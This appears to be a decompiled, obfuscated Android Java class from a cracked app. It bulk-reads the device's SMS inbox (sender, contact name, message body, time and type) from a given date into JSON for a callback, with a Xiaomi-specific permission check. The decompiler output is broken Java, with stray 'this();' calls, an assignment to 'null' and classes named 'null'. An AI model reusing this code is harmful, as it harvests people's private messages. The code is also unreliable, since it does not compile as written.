package com.xy.whf.a;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import com.xy.whf.helper.LangHelper;
import com.xy.whf.helper.PermissionHelper;
import com.xy.whf.helper.d;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;

public class h {
  private static h a;
  
  private Context b;
  
  private h(Context paramContext) {
    this.b = paramContext;
  }
  
  public static h a(Context paramContext) {
    if (a == null)
      a = new h(paramContext); 
    return a;
  }
  
  public void a(String paramString, int paramInt, b paramb) {
    (new a(paramString, paramInt, paramb)).execute((Object[])new Void[0]);
  }
  
  @SuppressLint({"StaticFieldLeak"})
  private class a extends AsyncTask<Void, Void, JSONArray> {
    private String b;
    
    private int c;
    
    private b d;
    
    private a(h this$0, String param1String, int param1Int, b param1b) {
      this.b = param1String;
      this.c = param1Int;
      this.d = param1b;
    }
    
    private JSONArray a() {
      Cursor cursor;
      JSONArray jSONArray = new JSONArray();
      try {
        ContentResolver contentResolver = h.a(this.a).getContentResolver();
        long l = d.a(this.b, "yyyy-MM-dd HH:mm:ss");
        Uri uri = Uri.parse("content://sms/");
        StringBuilder stringBuilder = new StringBuilder();
        this();
        String str = stringBuilder.append("date >= ").append(l).toString();
        cursor = contentResolver.query(uri, new String[] { "_id", "address", "person", "body", "date", "type" }, str, null, null);
        if (cursor != null) {
          if (cursor.getCount() <= this.c || this.c == 0)
            this.c = cursor.getCount(); 
          for (byte b1 = 0; b1 < this.c; b1++) {
            cursor.moveToPosition(b1);
            Date date = new Date();
            this(cursor.getLong(cursor.getColumnIndex("date")));
            JSONObject jSONObject = new JSONObject();
            this();
            int i = cursor.getInt(cursor.getColumnIndex("_id"));
            String str3 = cursor.getString(cursor.getColumnIndex("person"));
            String str4 = cursor.getString(cursor.getColumnIndex("address"));
            String str2 = cursor.getString(cursor.getColumnIndex("body"));
            int j = cursor.getInt(cursor.getColumnIndex("type"));
            jSONObject.put("sms_id", i);
            jSONObject.put("content", str2);
            jSONObject.put("phone", str4);
            jSONObject.put("sms_time", d.a(date, "yyyy-MM-dd HH:mm:ss"));
            if (!LangHelper.isNullOrEmpty(str3)) {
              jSONObject.put("name", str3);
            } else {
              jSONObject.put("name", str4);
            } 
            StringBuilder stringBuilder1 = new StringBuilder();
            this();
            String str1 = stringBuilder1.append("").append(j).toString();
            if (j == 1) {
              str1 = "接收";
            } else if (j == 2) {
              str1 = "发送";
            } else if (j == 3) {
              str1 = "草稿";
            } else if (j == 4) {
              str1 = "发件箱";
            } else if (j == 5) {
              str1 = "发送失败";
            } else if (j == 6) {
              str1 = "待发送列表";
            } else if (j == 0) {
              str1 = "所有短信";
            } 
            jSONObject.put("type", str1);
            jSONArray.put(jSONObject);
          } 
        } else {
          return jSONArray;
        } 
      } catch (Exception exception) {
        exception.printStackTrace();
        return jSONArray;
      } 
      cursor.close();
      return jSONArray;
    }
    
    protected JSONArray a(Void... param1VarArgs) {
      null = new JSONArray();
      try {
        if (Build.VERSION.SDK_INT >= 23) {
          boolean bool1 = Build.MANUFACTURER.equalsIgnoreCase("Xiaomi");
          boolean bool2 = PermissionHelper.b(h.a(this.a), "android:read_sms");
          boolean bool3 = PermissionHelper.a(h.a(this.a), "android.permission.READ_SMS");
          if (bool1) {
            if (!bool2 && !bool3) {
              Handler handler = new Handler();
              this(Looper.getMainLooper());
              Runnable runnable = new Runnable() {
                  public void run() {
                    h.a.a(this.a).a(null, 204);
                  }
                };
              super(this);
              handler.postDelayed(runnable, 20000L);
              return null;
            } 
            return a();
          } 
          if (!bool3) {
            Handler handler = new Handler();
            this(Looper.getMainLooper());
            Runnable runnable = new Runnable() {
                public void run() {
                  h.a.a(this.a).a(null, 204);
                }
              };
            super(this);
            handler.postDelayed(runnable, 20000L);
            return null;
          } 
          return a();
        } 
      } catch (Exception exception) {
        exception.printStackTrace();
        return null;
      } 
      return a();
    }
    
    protected void a(JSONArray param1JSONArray) {
      super.onPostExecute(param1JSONArray);
      if (!LangHelper.isNullOrEmpty(param1JSONArray)) {
        try {
          this.d.a(param1JSONArray, 0);
        } catch (Exception exception) {
          exception.printStackTrace();
        } 
        return;
      } 
      this.d.a(null, -1);
    }
  }
  
  class null implements Runnable {
    null(h this$0) {}
    
    public void run() {
      h.a.a(this.a).a(null, 204);
    }
  }
  
  class null implements Runnable {
    null(h this$0) {}
    
    public void run() {
      h.a.a(this.a).a(null, 204);
    }
  }
}


/* Location:              D:\Code\Crack\dex-tools-2.1-20190905-lanchon\zspns-pcgw-P36417A-0429-dex2jar.jar!\com\xy\whf\a\h.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */